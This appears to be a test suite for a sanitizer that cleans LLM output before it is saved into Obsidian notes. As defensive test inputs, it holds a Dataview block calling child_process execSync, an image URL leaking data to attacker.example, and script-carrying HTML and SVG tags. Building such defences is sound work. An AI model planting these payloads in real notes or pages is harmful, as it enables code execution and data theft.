import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import { merge, readRegion, renderCompanion } from '../src/notes/companion.ts';
import { disarmCode, sanitizeLlmOutput } from '../src/notes/sanitizeLlmOutput.ts';

const FENCE = '```';

describe('wikilinks', () => {
  it('keeps the alias of [[target|alias]]', () => {
    assert.equal(sanitizeLlmOutput('Met [[Alex Sample|Alex]] today.'), 'Met Alex today.');
  });

  it('keeps the target of a plain link', () => {
    assert.equal(sanitizeLlmOutput('Owner: [[Alex Sample]].'), 'Owner: Alex Sample.');
  });

  it('drops the heading or block part of [[target#heading]]', () => {
    assert.equal(sanitizeLlmOutput('See [[Roadmap#Q4 goals]].'), 'See Roadmap.');
    assert.equal(sanitizeLlmOutput('See [[Roadmap#^abc123]].'), 'See Roadmap.');
    assert.equal(sanitizeLlmOutput('See [[#Next steps]] below.'), 'See Next steps below.');
  });

  it('drops the folder of [[folder/target]]', () => {
    assert.equal(sanitizeLlmOutput('In [[30 Projects/Platform/Migration plan]].'), 'In Migration plan.');
    assert.equal(sanitizeLlmOutput('In [[30 Projects/Migration plan.md#Scope]].'), 'In Migration plan.');
  });

  it('unwraps embeds', () => {
    assert.equal(sanitizeLlmOutput('![[Decision log]]'), 'Decision log');
    assert.equal(sanitizeLlmOutput('![[assets/diagram.png|300]]'), 'diagram.png');
    assert.equal(sanitizeLlmOutput('![[Decision log|the log]]'), 'the log');
  });

  it('handles [[a|b|c]] by keeping everything after the first pipe', () => {
    assert.equal(sanitizeLlmOutput('[[a|b|c]]'), 'b|c');
  });

  it('handles the escaped pipe used inside tables', () => {
    assert.equal(sanitizeLlmOutput('| [[Alex Sample\\|Alex]] | lead |'), '| Alex | lead |');
  });

  it('handles the escaped pipe in front of an embed size', () => {
    assert.equal(sanitizeLlmOutput('| ![[assets/plan.png\\|300]] | [[Roadmap\\|]] |'), '| plan.png | Roadmap |');
  });

  it('falls back to the target when the alias is empty', () => {
    assert.equal(sanitizeLlmOutput('[[Alex Sample|]]'), 'Alex Sample');
  });

  it('unlinks a bullet that echoes [[R&D]]', () => {
    assert.equal(
      sanitizeLlmOutput('* **Budget:** [[R&D]] will review the [[R&D|research and dev]] request'),
      '* **Budget:** R&D will review the research and dev request',
    );
  });

  it('does not loop on nested or unbalanced brackets', () => {
    assert.equal(sanitizeLlmOutput('[[a [[b]] c]]'), 'a b c');
    assert.equal(sanitizeLlmOutput('[[[[x]]]]'), 'x');
    assert.equal(sanitizeLlmOutput('[[[x]]]'), '[x]');
    assert.equal(sanitizeLlmOutput('[[x|[[y|z]]]]'), 'z');
    assert.equal(sanitizeLlmOutput('open [[ only'), 'open [[ only');
    assert.equal(sanitizeLlmOutput('close ]] only'), 'close ]] only');
    assert.equal(sanitizeLlmOutput('[['.repeat(2000)), '[['.repeat(2000));
    assert.equal(sanitizeLlmOutput(`${'[['.repeat(300)}deep${']]'.repeat(300)}`), 'deep');
    assert.equal(sanitizeLlmOutput(`${'[[a|'.repeat(500)}end`), `${'[[a|'.repeat(500)}end`);
  });

  it('leaves no wikilink behind in ordinary prose', () => {
    const out = sanitizeLlmOutput('- [[A]] and [[B|b]]\n- ![[C]] then [[D#h|d]] and [[e/F]]');
    assert.equal(out, '- A and b\n- C then d and F');
    assert.ok(!out.includes('[['));
  });

  it('leaves Markdown links and single brackets alone', () => {
    const text = 'See [the doc](https://example.com/a) and item [1] or [x].';
    assert.equal(sanitizeLlmOutput(text), text);
  });

  it('keeps wikilinks when asked to, but never an embed', () => {
    const text = 'Met [[Alex Sample|Alex]] and ![[Decision log]].';
    // An embed would pull a whole note, or an image, into the companion.
    assert.equal(
      sanitizeLlmOutput(text, { keepWikilinks: true }),
      'Met [[Alex Sample|Alex]] and !\\[[Decision log]].',
    );
  });
});

describe('Markdown links to notes', () => {
  it('keeps the text of a link whose target is a note', () => {
    // Obsidian resolves these like wikilinks: they would show up in the note's backlinks.
    assert.equal(
      sanitizeLlmOutput('See [Jane](Jane%20Example.md) and [x](<40 Resources/People/Jane Example>).'),
      'See Jane and x.',
    );
    assert.equal(sanitizeLlmOutput('Owner: [Jane](Jane Example.md), per [the plan](Plans/Q4 (draft).md "Plan").'), 'Owner: Jane, per the plan.');
    assert.equal(sanitizeLlmOutput('- [ ] ask [see [[Jane Example|Jane]]](People/Jane.md)'), '- ask see Jane');
  });

  it('unwraps an embedded note or picture', () => {
    assert.equal(sanitizeLlmOutput('![the chart](Attachments/chart.png) as shown'), 'the chart as shown');
    assert.equal(sanitizeLlmOutput('Before ![](Decision%20log.md) after'), 'Before  after');
  });

  it('leaves links to the web, to a heading of the note itself, and what is no link', () => {
    for (const text of [
      'See [the doc](https://example.com/a_(b)) or [write](mailto:jane@example.com).',
      'Back to [the decisions](#Decisions) and [the vault](obsidian://open?vault=Work&file=Plan).',
      'An empty one [x]() and a citation [1] (Budget 2026).',
      'Use `[Jane](Jane.md)` to link by hand.',
    ]) {
      assert.equal(sanitizeLlmOutput(text), text);
    }
  });

  it('keeps them when wikilinks are kept', () => {
    const text = 'See [Jane](Jane%20Example.md).';
    assert.equal(sanitizeLlmOutput(text, { keepWikilinks: true }), text);
  });

  it('does not loop on brackets and parentheses that never close', () => {
    const started = Date.now();
    sanitizeLlmOutput(`${'[a'.repeat(20_000)}\n${'[a]('.repeat(20_000)}\n${'[a](b('.repeat(20_000)}`);
    assert.ok(Date.now() - started < 2000);
  });
});

describe('task checkboxes', () => {
  it('removes the checkbox from list items', () => {
    assert.equal(sanitizeLlmOutput('- [ ] call back'), '- call back');
    assert.equal(sanitizeLlmOutput('* [x] sent the deck'), '* sent the deck');
    assert.equal(sanitizeLlmOutput('1. [ ] first'), '1. first');
    assert.equal(sanitizeLlmOutput('+ [X] done'), '+ done');
    assert.equal(sanitizeLlmOutput('2) [/] in progress'), '2) in progress');
  });

  it('removes it from nested and quoted items', () => {
    assert.equal(sanitizeLlmOutput('- parent\n    - [ ] child\n\t* [x] other'), '- parent\n    - child\n\t* other');
    assert.equal(sanitizeLlmOutput('> - [ ] quoted'), '> - quoted');
  });

  it('drops an item that was only a checkbox', () => {
    assert.equal(sanitizeLlmOutput('Actions\n- [ ]\n- [ ] real one'), 'Actions\n- real one');
  });

  it('removes repeated checkboxes in one go', () => {
    assert.equal(sanitizeLlmOutput('- [ ] [x] twice'), '- twice');
  });

  it('treats any single-character status as a checkbox, as the Tasks plugin does', () => {
    assert.equal(sanitizeLlmOutput('- [>] forwarded\n- [!] important\n- [1] numbered source'), '- forwarded\n- important\n- numbered source');
  });

  it('leaves brackets that are not checkboxes', () => {
    const untouched = [
      '- [link](https://example.com) text',
      '- [x](https://example.com)',
      'Not a list [ ] here',
      'A citation [1] in a sentence.',
      '- [ok] label',
      '- [^1] footnote',
      '-[ ] no space',
      '- [ ]no space after',
    ];
    for (const text of untouched) assert.equal(sanitizeLlmOutput(text), text);
  });

  it('leaves a checkbox quoted as inline code', () => {
    for (const text of ['`- [ ] literal`', 'Write `- [ ] task` to add one.']) {
      assert.equal(sanitizeLlmOutput(text), text);
    }
  });

  it('keeps checkboxes when asked to', () => {
    assert.equal(sanitizeLlmOutput('- [ ] call [[Alex Sample]]', { keepTasks: true }), '- [ ] call Alex Sample');
  });
});

describe('hamster comments', () => {
  it('removes a marker on its own line together with the line', () => {
    assert.equal(
      sanitizeLlmOutput('- one\n<!-- hamster:end enhanced -->\n- two'),
      '- one\n- two',
    );
  });

  it('removes markers inline, however they are spaced', () => {
    assert.equal(sanitizeLlmOutput('a <!-- hamster:begin qa --> b'), 'a  b');
    assert.equal(sanitizeLlmOutput('a<!--hamster:end qa-->b'), 'ab');
    assert.equal(sanitizeLlmOutput('a<!--   hamster:whatever else   -->b'), 'ab');
    assert.equal(sanitizeLlmOutput('<!-- hamster:begin qa --><!-- hamster:end qa -->'), '');
  });

  it('removes them inside code too', () => {
    const out = sanitizeLlmOutput(`${FENCE}\n<!-- hamster:begin enhanced -->\ncode\n${FENCE}\nand \`<!-- hamster:end qa -->\``);
    assert.equal(out, `${FENCE}\ncode\n${FENCE}\nand \`\``);
  });

  it('defuses an unterminated opener without eating the text after it', () => {
    const out = sanitizeLlmOutput('Before <!-- hamster:begin enhanced\nNext line: A --> B\nLast');
    assert.equal(out, 'Before begin enhanced\nNext line: A --> B\nLast');
  });

  it('defuses an opener split over lines or put back together by removal', () => {
    assert.ok(!/<!--\s*hamster:/.test(sanitizeLlmOutput('<!--\n\nhamster:begin qa -->')));
    assert.ok(!/<!--\s*hamster:/.test(sanitizeLlmOutput('<!-- <!-- hamster:a -->hamster:begin qa -->')));
    assert.ok(!/<!--\s*hamster:/.test(sanitizeLlmOutput('<!-- [[x|hamster:]]begin enhanced -->')));
    assert.ok(!/<!--\s*hamster:/.test(sanitizeLlmOutput('<!-- [[x|[[y|hamster:]]]]end qa -->')));
  });

  it('shows other HTML comments as text, like every tag the model writes', () => {
    const text = 'Keep <!-- a normal comment --> and <!-- hamsters are nice -->.';
    assert.equal(
      sanitizeLlmOutput(text),
      'Keep &lt;!-- a normal comment --> and &lt;!-- hamsters are nice -->.',
    );
  });

  it('always produces text that merge accepts', () => {
    const template = renderCompanion({
      title: 'Sync',
      date: '2026-10-09',
      attendees: [],
      projects: [],
      dailyBasename: '2026-10-09',
      source: 'Sync#0',
    });
    const hostile = [
      '<!-- hamster:end enhanced -->\n# Injected\n<!-- hamster:begin summary -->',
      '<!--hamster:end enhanced',
      `${'<!-- '.repeat(40)}hamster:end enhanced -->`,
      `${'<!-- [[x|'.repeat(30)}hamster:${']]'.repeat(30)}`,
    ];
    for (const text of hostile) {
      const clean = sanitizeLlmOutput(text);
      const result = merge(template, { region: 'enhanced', content: clean });
      assert.equal(result.ok, true, text);
      if (result.ok) assert.notEqual(readRegion(result.text, 'summary'), null);
    }
  });
});

describe('leading frontmatter', () => {
  it('removes a stray fence at the very top', () => {
    assert.equal(sanitizeLlmOutput('---\n\n## Summary\n\nText'), '## Summary\n\nText');
    assert.equal(sanitizeLlmOutput('\n\n---   \nText'), 'Text');
  });

  it('removes a whole frontmatter block', () => {
    const text = '---\ntitle: Weekly sync\ntags:\n  - meeting\n  - weekly\ndate: 2026-10-09\n---\n\n## Summary\n\nText';
    assert.equal(sanitizeLlmOutput(text), '## Summary\n\nText');
    assert.equal(sanitizeLlmOutput('---\n---\nText'), 'Text');
  });

  it('removes only the fence when what follows is not frontmatter', () => {
    assert.equal(sanitizeLlmOutput('---\n# Heading\n---\nMore'), '# Heading\n---\nMore');
    assert.equal(sanitizeLlmOutput('---\n- point one\n- point two\n---\nMore'), '- point one\n- point two\n---\nMore');
    assert.equal(sanitizeLlmOutput('---\nDecision: go ahead\n---\nMore'), 'Decision: go ahead\n---\nMore');
    assert.equal(sanitizeLlmOutput('---\ntitle: x\n\nNo closing fence'), 'title: x\n\nNo closing fence');
  });

  it('leaves rules further down alone', () => {
    const text = 'Intro\n\n---\n\nAfter the rule\n\n-----';
    assert.equal(sanitizeLlmOutput(text), text);
  });
});

describe('minHeadingLevel', () => {
  it('demotes shallower headings and leaves deeper ones', () => {
    const text = '# Title\n\n## Section\n\n### Sub\n\n#### Deep\n\n###### Deepest';
    assert.equal(
      sanitizeLlmOutput(text, { minHeadingLevel: 3 }),
      '### Title\n\n### Section\n\n### Sub\n\n#### Deep\n\n###### Deepest',
    );
  });

  it('leaves headings alone when not set', () => {
    assert.equal(sanitizeLlmOutput('# Title\n\n## Section'), '# Title\n\n## Section');
    assert.equal(sanitizeLlmOutput('# Title', { minHeadingLevel: 1 }), '# Title');
  });

  it('does not touch tags, mid-line hashes or code', () => {
    const text = [
      '#tag at the start',
      'Issue #12 and a #tag mid-line',
      '`# not a heading`',
      FENCE,
      '# a shell comment',
      '## another',
      FENCE,
      '# Real heading',
    ].join('\n');
    const expected = text.replace('# Real heading', '### Real heading');
    assert.equal(sanitizeLlmOutput(text, { minHeadingLevel: 3 }), expected);
  });

  it('demotes underlined (setext) headings too', () => {
    assert.equal(sanitizeLlmOutput('Weekly sync\n===========\n\nText', { minHeadingLevel: 3 }), '### Weekly sync\n\nText');
    assert.equal(sanitizeLlmOutput('Intro\n\nDecisions\n---------\n\nText', { minHeadingLevel: 3 }), 'Intro\n\n### Decisions\n\nText');
    // A rule typed straight under a sentence is a level-2 heading to Markdown, whatever was meant.
    assert.equal(sanitizeLlmOutput('We ship on Friday.\n---\nNext', { minHeadingLevel: 3 }), '### We ship on Friday.\nNext');
    assert.equal(sanitizeLlmOutput('A title on\n  two lines\n=', { minHeadingLevel: 3 }), '### A title on two lines');
    assert.equal(sanitizeLlmOutput('# Top\nUnder a heading\n===', { minHeadingLevel: 4 }), '#### Top\n#### Under a heading');
    // Sections fenced off by rules with no blank lines: every second rule is an underline.
    assert.equal(
      sanitizeLlmOutput('Intro\n\n---\nFirst part\n---\nSecond part\n***\nThird\n---', { minHeadingLevel: 3 }),
      'Intro\n\n---\n### First part\nSecond part\n***\n### Third',
    );
    assert.equal(sanitizeLlmOutput('- item\n\n   Inside the item\n   ---', { minHeadingLevel: 3 }), '- item\n\n   ### Inside the item');
  });

  it('demotes only the underlined headings that are shallower', () => {
    assert.equal(sanitizeLlmOutput('Title\n===\n\nSection\n---', { minHeadingLevel: 2 }), '## Title\n\nSection\n---');
    for (const text of ['Title\n===\n\nSection\n---']) {
      assert.equal(sanitizeLlmOutput(text), text);
      assert.equal(sanitizeLlmOutput(text, { minHeadingLevel: 1 }), text);
    }
  });

  it('leaves rules and underlines that make no heading', () => {
    const untouched = [
      'Intro\n\n---\n\nAfter the rule',
      '- item\n---\nAfter',
      '- item\nlazy line\n---\nAfter',
      '> quote\n---\nAfter',
      '> quote\nlazy line\n===',
      '| a | b |\n|---|---|\n| 1 | 2 |',
      'a | b\n---|---\n1 | 2',
      'Owner | Task\n--- | ---\nSam | Send the deck\n---\nAfter the table',
      'Intro\n\n[^1]: A footnote\n---',
      '$$\nx = 1\n$$\n---',
      `${FENCE}\nTitle\n===\n${FENCE}`,
      `${FENCE}\ncode\n${FENCE}\n===`,
      `Intro\n\n \t${FENCE}\nTitle\n \t${FENCE}\n---`,
      'Title\n=== not an underline',
      'Title\n- - -',
      '===\n\n---',
    ];
    for (const text of untouched) assert.equal(sanitizeLlmOutput(text, { minHeadingLevel: 3 }), text, text);
  });

  it('reads an underline under a tag shown as text for the heading it now is', () => {
    // Once `<div>` is text and no longer opens an HTML block, the two lines above `---` are a paragraph.
    assert.equal(sanitizeLlmOutput('<div>\nhtml\n---', { minHeadingLevel: 3 }), '### &lt;div> html');
  });

  it('does not walk back over the whole text for every underline', () => {
    // Under a list item none of these is a heading; each one must stop the walk of the next.
    const text = `- item\n${'lazy\n--\n'.repeat(30000)}end`;
    const started = performance.now();
    assert.equal(sanitizeLlmOutput(text, { minHeadingLevel: 3 }), text);
    const took = Math.round(performance.now() - started);
    assert.ok(took < 1500, `took ${took} ms`);
  });

  it('clamps the level to what Markdown has', () => {
    assert.equal(sanitizeLlmOutput('# A', { minHeadingLevel: 9 }), '###### A');
    assert.equal(sanitizeLlmOutput('# A', { minHeadingLevel: 0 }), '# A');
    assert.equal(sanitizeLlmOutput('# A', { minHeadingLevel: Number.NaN }), '# A');
  });
});

describe('whitespace', () => {
  it('trims trailing whitespace on every line', () => {
    assert.equal(sanitizeLlmOutput('one  \ntwo\t\nthree   '), 'one\ntwo\nthree');
  });

  it('collapses runs of blank lines to one', () => {
    assert.equal(sanitizeLlmOutput('a\n\n\n\nb\n\n\n\n\n\nc\n\nd'), 'a\n\nb\n\nc\n\nd');
    assert.equal(sanitizeLlmOutput('a\n  \n\t\n   \nb'), 'a\n\nb');
  });

  it('trims the result', () => {
    assert.equal(sanitizeLlmOutput('\n\n  text  \n\n'), 'text');
    assert.equal(sanitizeLlmOutput('   \n\n'), '');
    assert.equal(sanitizeLlmOutput(''), '');
  });

  it('normalises CRLF', () => {
    assert.equal(sanitizeLlmOutput('a\r\nb\r\n\r\n\r\n\r\nc\r\n'), 'a\nb\n\nc');
  });
});

describe('code is left alone', () => {
  it('does not unlink or uncheck inside a fenced block', () => {
    const body = ['- [ ] a task in an example', 'See [[Some Note|alias]]   ', '', '', '', '# heading', FENCE].join('\n');
    const text = `Before [[Link]]\n\n${FENCE}md\n${body}\n\n- [ ] after`;
    // The block keeps its text; only the language on its first line goes (see the last suite).
    assert.equal(sanitizeLlmOutput(text, { minHeadingLevel: 3 }), `Before Link\n\n${FENCE}\n${body}\n\n- after`);
  });

  it('handles tilde fences, longer closing fences and fences inside lists', () => {
    const tilde = '~~~\n[[a]]\n```\n[[b]]\n~~~~\n[[c]]';
    assert.equal(sanitizeLlmOutput(tilde), '~~~\n[[a]]\n```\n[[b]]\n~~~~\nc');
    const nested = '- item\n    ```\n    [[kept]]\n    ```\n- [[gone]]';
    assert.equal(sanitizeLlmOutput(nested), '- item\n    ```\n    [[kept]]\n    ```\n- gone');
  });

  it('does not unlink inside inline code', () => {
    assert.equal(
      sanitizeLlmOutput('Write `[[Note]]` to link [[Note]], or ``a ` [[b]]`` too.'),
      'Write `[[Note]]` to link Note, or ``a ` [[b]]`` too.',
    );
    assert.equal(sanitizeLlmOutput('A lone ` backtick and [[Note]]'), 'A lone ` backtick and Note');
  });

  it('reads three backticks closed on the same line as inline code, not as a fence', () => {
    const text = `${FENCE}[[kept]]${FENCE} then [[Gone]]\n\n- [ ] still a normal line`;
    assert.equal(sanitizeLlmOutput(text), `${FENCE}[[kept]]${FENCE} then Gone\n\n- still a normal line`);
  });

  it('closes a code block the model left open', () => {
    const out = sanitizeLlmOutput('Example:\n\n```js\nconst a = 1;');
    assert.equal(out, 'Example:\n\n```\nconst a = 1;\n```');
    assert.equal(sanitizeLlmOutput('> ~~~~\n> quoted code'), '> ~~~~\n> quoted code\n> ~~~~');
  });
});

describe('idempotence', () => {
  const samples = [
    '',
    'Plain text.',
    '---\ntitle: x\n---\n\n# Title\n\n- [ ] [[Alex Sample|Alex]] to send [[30 Projects/Plan#Scope]]\n\n\n\n<!-- hamster:end summary -->\n## Next\n',
    '- [[a|[x]]] item',
    '<!-- hamster:begin qa -->\n---\n# Top',
    '    # indented at the top\n\n# next',
    '[[a [[b]] c]] and `[[code]]` and ![[embed|40]]',
    '- [ ]\n-\n- [ ] [ ] x',
    '```\nunclosed [[x]]\n\n\n\n',
    'a  \r\n\r\n\r\n\r\nb\t\r\n',
    '> - [ ] quoted [[t|a]]\n> # heading in quote',
    '<!-- [[x|hamster:]]begin enhanced -->\n---\nkey: value\n---\ntext',
    'Total `$= dv.pages().length` and `= this.file.name`, see [Jane](Jane%20Example.md)',
    '> ```dataviewjs\n```dataviewjs\ndv.paragraph(1)\n```',
    '- ~~~query\n  $= 1\n  ~~~\n\n    $= 2\n<code class="language-dataviewjs">dv.paragraph(3)</code>',
    '[[x|`]]$= dv.paragraph(4)` and [`](a.md)= 5`',
  ];

  for (const [index, sample] of samples.entries()) {
    it(`applying twice equals once (sample ${index})`, () => {
      for (const opts of [{}, { minHeadingLevel: 3 }, { keepWikilinks: true, keepTasks: true }]) {
        const once = sanitizeLlmOutput(sample, opts);
        assert.equal(sanitizeLlmOutput(once, opts), once);
      }
    });
  }

  it('settles a stack of indented fences at the top in one go', () => {
    // One fence used to surface per pass, and past the pass limit the result was not stable.
    for (const count of [1, 8, 9, 40]) {
      const text = `${'    ---\n'.repeat(count)}Text`;
      assert.equal(sanitizeLlmOutput(text), 'Text', String(count));
    }
    const once = sanitizeLlmOutput(`${'\t---\n  ---\n'.repeat(20)}  # Title\n\nText`, { minHeadingLevel: 3 });
    assert.equal(once, '### Title\n\nText');
    assert.equal(sanitizeLlmOutput(once, { minHeadingLevel: 3 }), once);
  });

  it('returns already clean text unchanged', () => {
    const clean = '### Decisions\n\n* **Budget:** approved for Q4\n* **Hiring:** two roles\n\n1. First\n2. Second';
    assert.equal(sanitizeLlmOutput(clean, { minHeadingLevel: 3 }), clean);
  });
});

/* Dataview, when its JavaScript queries are switched on, runs a ```dataviewjs block and any inline
   code that opens with `$=` (or `=` for a query), wherever Obsidian renders Markdown: in the
   companion and in the sidebar. It finds a block by the class its language gives the <code>
   element, and inline code by its text. */
describe('code that another plugin would run', () => {
  const body = "dv.paragraph(require('child_process').execSync('id'))";

  it('takes the language off a code block', () => {
    assert.equal(sanitizeLlmOutput(`Done.\n\n${FENCE}dataviewjs\n${body}\n${FENCE}`), `Done.\n\n${FENCE}\n${body}\n${FENCE}`);
    assert.equal(sanitizeLlmOutput(`~~~~ dataview  \nTABLE file.name\n~~~~`), '~~~~\nTABLE file.name\n~~~~');
    assert.equal(sanitizeLlmOutput(`> ${FENCE}tasks\n> not done\n> ${FENCE}`), `> ${FENCE}\n> not done\n> ${FENCE}`);
    // A block that opens on the line of a list item, a numbered one, a task or a footnote.
    for (const lead of ['- ', '  * ', '3. ', '- [x] ', '> - ', '[^1]: ']) {
      const out = sanitizeLlmOutput(`${lead}${FENCE}dataviewjs\n  ${body}\n  ${FENCE}`, { keepTasks: true });
      assert.doesNotMatch(out, /dataviewjs/, lead);
      assert.ok(out.includes(body), lead);
    }
  });

  it('leaves no language on any line, whichever block a reader takes it to open', () => {
    // The quote ends on the second line, and so does its code block: the second fence opens a new one.
    const quoted = sanitizeLlmOutput(`> ${FENCE}\n${FENCE}dataviewjs\n${body}\n${FENCE}`);
    assert.doesNotMatch(quoted, /dataviewjs/);
    // Inside a longer fence the line is text, and still loses its language.
    const nested = sanitizeLlmOutput(`${FENCE}${FENCE}\n${FENCE}dataviewjs\n${body}\n${FENCE}\n${FENCE}${FENCE}`);
    assert.equal(nested, `${FENCE}${FENCE}\n${FENCE}\n${body}\n${FENCE}\n${FENCE}${FENCE}`);
    // Put together by the removal of a marker.
    assert.doesNotMatch(sanitizeLlmOutput(`${FENCE}<!-- hamster:begin qa -->dataviewjs\n${body}\n${FENCE}`), /dataviewjs/);
  });

  it('keeps inline code from opening on a query', () => {
    assert.equal(sanitizeLlmOutput('Notes: `$= dv.pages().length` in all.'), 'Notes: `\\$= dv.pages().length` in all.');
    assert.equal(sanitizeLlmOutput('Here `= this.file.name` and ``  $= 1 ``.'), 'Here `\\= this.file.name` and ``  \\$= 1 ``.');
    // Over a line break, in a quote, after a space that is not a space, and found by another pairing of the backticks.
    assert.equal(sanitizeLlmOutput('a `\n$= 1` b'), 'a `\n\\$= 1` b');
    assert.equal(sanitizeLlmOutput('> a `\n> $= 1` b'), '> a `\n> \\$= 1` b');
    assert.equal(sanitizeLlmOutput('a `\u00a0$= 1` b'), 'a `\u00a0\\$= 1` b');
    assert.equal(sanitizeLlmOutput('- a ` b\n- `$= 1`'), '- a ` b\n- `\\$= 1`');
  });

  it('leaves code and an equals sign that open nothing', () => {
    for (const text of [
      'Set `timeout` = 30 and move on.',
      'Compare `a == b` with `a === b`.',
      'The total is $= 40 and x = y.',
      `${FENCE}\nconst a = 1;\n${FENCE}`,
    ]) {
      assert.equal(sanitizeLlmOutput(text), text);
    }
  });

  it('keeps a code block from opening on a script too', () => {
    // Dataview also reads a whole block without a language as inline code.
    assert.equal(sanitizeLlmOutput(`${FENCE}dataviewjs\n\n  $= ${body}\n${FENCE}`), `${FENCE}\n\n  \\$= ${body}\n${FENCE}`);
    assert.equal(sanitizeLlmOutput('~~~\n$= 1\n~~~'), '~~~\n\\$= 1\n~~~');
    assert.equal(sanitizeLlmOutput(`> ${FENCE}\n${FENCE}\n$= 1\n${FENCE}`), `> ${FENCE}\n${FENCE}\n\\$= 1\n${FENCE}\n${FENCE}`);
    assert.equal(sanitizeLlmOutput('Text.\n\n    $= 1 + 1\n\t$= 2'), 'Text.\n\n    \\$= 1 + 1\n\t\\$= 2');
    // A query runs no code: a block that opens on one is left as written.
    const query = '~~~\n= this.file.name\n~~~';
    assert.equal(sanitizeLlmOutput(query), query);
  });

  it('shows a raw code tag as text', () => {
    assert.equal(
      sanitizeLlmOutput(`<pre><code class="language-dataviewjs">${body}</code></pre> and <CODE>$= 1</CODE>`),
      `&lt;pre>&lt;code class="language-dataviewjs">${body}&lt;/code>&lt;/pre> and &lt;CODE>$= 1&lt;/CODE>`,
    );
    assert.equal(
      sanitizeLlmOutput('The <codec> and <b>bold</b> show as written.'),
      'The &lt;codec> and &lt;b>bold&lt;/b> show as written.',
    );
    assert.equal(sanitizeLlmOutput('a < b and 3<4, line<br>break'), 'a < b and 3<4, line<br>break');
  });

  it('does the same for text that is only shown', () => {
    assert.equal(disarmCode(`${FENCE}dataviewjs\n${body}`), `${FENCE}\n${body}`);
    assert.equal(disarmCode('Count: `$= 1`, see [[Note]] and - [ ] this'), 'Count: `\\$= 1`, see [[Note]] and - [ ] this');
    const plain = 'Nothing to change here.';
    assert.equal(disarmCode(plain), plain);
  });
});

describe('nothing saved can be fetched when the note is drawn', () => {
  it('turns a remote image into its characters', () => {
    const out = sanitizeLlmOutput('Done. ![ ](https://attacker.example/p.png?d=budget-40k)');
    assert.ok(!/!\[/.test(out), out);
    assert.ok(out.includes('attacker.example'), 'the address stays readable as text');
  });

  it('turns raw HTML into its characters, wherever it stands', () => {
    for (const html of [
      '<img src="https://attacker.example/x.png">',
      '<iframe src="https://attacker.example"></iframe>',
      '<span style="background:url(https://attacker.example/x)">x</span>',
      '- item <IMG SRC=//attacker.example/x>',
      '> quote <svg onload=alert(1)>',
    ]) {
      const out = sanitizeLlmOutput(html);
      assert.ok(!/<[A-Za-z/!?]/.test(out.replace(/<br\s*\/?>/gi, '')), `${html} -> ${out}`);
    }
  });

  it('is stable: sanitizing twice changes nothing more', () => {
    const once = sanitizeLlmOutput('See ![x](https://a.example/i.png) and <b>this</b>.\n\n```js\n<img src=x>\n```');
    assert.equal(sanitizeLlmOutput(once), once);
  });
});

describe('a link whose label holds code', () => {
  it('is reduced to its label when it points to a note', () => {
    assert.equal(sanitizeLlmOutput('See [`config.md`](40 Resources/config.md) first.'), 'See `config.md` first.');
    assert.equal(sanitizeLlmOutput('See [a `b` c](Note.md).'), 'See a `b` c.');
  });

  it('is kept when it points to the web', () => {
    const text = 'See [`fetch`](https://example.com/fetch).';
    assert.equal(sanitizeLlmOutput(text), text);
  });

  it('is kept when links are asked for', () => {
    const text = 'See [`config.md`](40 Resources/config.md).';
    assert.equal(sanitizeLlmOutput(text, { keepWikilinks: true }), text);
  });
});

describe('disarmCode on text that is only shown', () => {
  it('leaves a raw code tag as written: the sidebar draws text, not HTML', () => {
    assert.equal(disarmCode('Call the <code>render()</code> method'), 'Call the <code>render()</code> method');
  });

  it('while the saved text still turns it into its characters', () => {
    assert.equal(
      sanitizeLlmOutput('Call the <code>render()</code> method'),
      'Call the &lt;code>render()&lt;/code> method',
    );
  });
});
